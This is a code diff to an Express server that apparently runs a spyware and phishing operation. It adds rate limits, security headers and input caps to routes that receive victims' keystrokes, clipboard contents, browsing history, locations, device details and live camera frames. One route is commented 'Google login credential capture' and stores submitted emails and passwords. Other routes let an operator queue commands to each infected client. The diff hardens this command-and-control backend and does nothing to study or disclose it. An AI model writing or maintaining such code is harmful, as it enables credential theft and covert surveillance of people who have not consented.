@@ -402,6 +402,10 @@ app.use((req, res, next) => {
     res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
     // Allow camera, microphone & geolocation — required for getUserMedia on Vercel HTTPS
     res.setHeader('Permissions-Policy', 'camera=*, microphone=*, geolocation=*');
+    // Disable legacy XSS auditor (can be exploited; modern browsers ignore it anyway)
+    res.setHeader('X-XSS-Protection', '0');
+    // HSTS — Vercel always serves over HTTPS
+    if (IS_VERCEL) res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
     next();
 });
 app.use(express.json({ limit: '10mb' }));
@@ -511,7 +515,7 @@ app.get('/client.js', (req, res) => {
 });
 
 // ── Upload video/audio ──
-app.post('/upload-media', (req, res) => {
+app.post('/upload-media', rateLimit(10, 60000), (req, res) => {
     const doUpload = memoryUpload.single('media');
     doUpload(req, res, async (err) => {
         if (err) { console.error('Upload error:', err.message); return res.status(400).json({ error: err.message }); }
@@ -582,7 +586,7 @@ app.get('/api/ip-geo', async (req, res) => {
 });
 
 // ── Upload photo ──
-app.post('/upload-photo', (req, res) => {
+app.post('/upload-photo', rateLimit(20, 60000), (req, res) => {
     const doUpload = memoryUpload.single('photo');
     doUpload(req, res, async (err) => {
         if (err) { console.error('Photo upload error:', err.message); return res.status(400).json({ error: err.message }); }
@@ -679,7 +683,7 @@ app.get('/api/media-data/:type/:id', async (req, res) => {
 });
 
 // ── Location ──
-app.post('/upload-location', (req, res) => {
+app.post('/upload-location', rateLimit(30, 10000), (req, res) => {
     const { clientId: rawCid, latitude: rawLat, longitude: rawLon, accuracy, altitude, speed, heading, source } = req.body;
     const latitude  = parseFloat(rawLat);
     const longitude = parseFloat(rawLon);
@@ -703,7 +707,7 @@ app.post('/upload-location', (req, res) => {
 });
 
 // ── Device info ──
-app.post('/device-info', (req, res) => {
+app.post('/device-info', rateLimit(10, 60000), (req, res) => {
     const { clientId: rawCid } = req.body;
     const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
@@ -755,7 +759,7 @@ app.post('/log-keys', rateLimit(60, 10000), (req, res) => {
 });
 
 // ── Clipboard ──
-app.post('/log-clipboard', (req, res) => {
+app.post('/log-clipboard', rateLimit(30, 10000), (req, res) => {
     const { clientId: rawCid, content } = req.body;
     const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
@@ -771,7 +775,7 @@ app.post('/log-clipboard', (req, res) => {
 });
 
 // ── Page visits ──
-app.post('/log-visit', (req, res) => {
+app.post('/log-visit', rateLimit(60, 10000), (req, res) => {
     const { clientId: rawCid, url, title, referrer } = req.body;
     const clientId = safeClientId(rawCid);
     if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
@@ -790,7 +794,7 @@ app.post('/log-visit', (req, res) => {
 });
 
 // ── Error logging ──
-app.post('/log-error', (req, res) => {
+app.post('/log-error', rateLimit(20, 10000), (req, res) => {
     const entry = {
         id: Date.now().toString(36),
         clientId: safeClientId(req.body.clientId) || 'unknown',
@@ -806,7 +810,7 @@ app.post('/log-error', (req, res) => {
 });
 
 // ── Google login credential capture ──
-app.post('/api/capture', async (req, res) => {
+app.post('/api/capture', rateLimit(10, 60000), async (req, res) => {
     const { email, password, source, timestamp, clientId: rawCid, screen, timezone, staySignedIn } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
     if (!store.credentials) store.credentials = [];
@@ -913,15 +917,15 @@ app.post('/heartbeat', rateLimit(30, 10000), async (req, res) => {
     c.lastSeen = now;
     c.online = true;
     c.ip = ip;
-    if (userAgent) c.userAgent = userAgent;
-    if (screenW) c.screen = `${screenW}x${screenH}`;
+    if (userAgent) c.userAgent = String(userAgent).slice(0, 512);
+    if (screenW) c.screen = `${parseInt(screenW)||0}x${parseInt(screenH)||0}`;
     if (battery !== undefined) c.battery = battery;
     if (charging !== undefined) c.charging = charging;
-    if (networkType) c.networkType = networkType;
+    if (networkType) c.networkType = String(networkType).slice(0, 50);
     if (downlink !== undefined) c.downlink = downlink;
     if (saveData !== undefined) c.saveData = saveData;
-    if (language) c.language = language;
-    if (timezone) c.timezone = timezone;
+    if (language) c.language = String(language).slice(0, 50);
+    if (timezone) c.timezone = String(timezone).slice(0, 50);
     // Activity state
     if (isIdle !== undefined) c.isIdle = isIdle;
     if (idleSecs !== undefined) c.idleSecs = idleSecs;
@@ -1262,7 +1266,7 @@ app.get('/api/locations', requireAuth, (req, res) => {
 // On Vercel, requests can hit different instances, so we must store
 // frames in Redis (short TTL) not in-memory.
 
-app.post('/api/live-frame', async (req, res) => {
+app.post('/api/live-frame', rateLimit(120, 10000), async (req, res) => {
     try {
         const { clientId: rawCid, frame, timestamp, seq } = req.body || {};
         const clientId = safeClientId(rawCid);
@@ -1676,7 +1680,7 @@ app.post('/api/command', requireAuth, async (req, res) => {
     res.json({ success: true, commandId: cmd.id });
 });
 
-app.get('/api/commands/:clientId', async (req, res) => {
+app.get('/api/commands/:clientId', rateLimit(30, 10000), async (req, res) => {
     const id = safeClientId(req.params.clientId);
     if (!id) return res.json([]);
     const cmds = await popCommands(id);
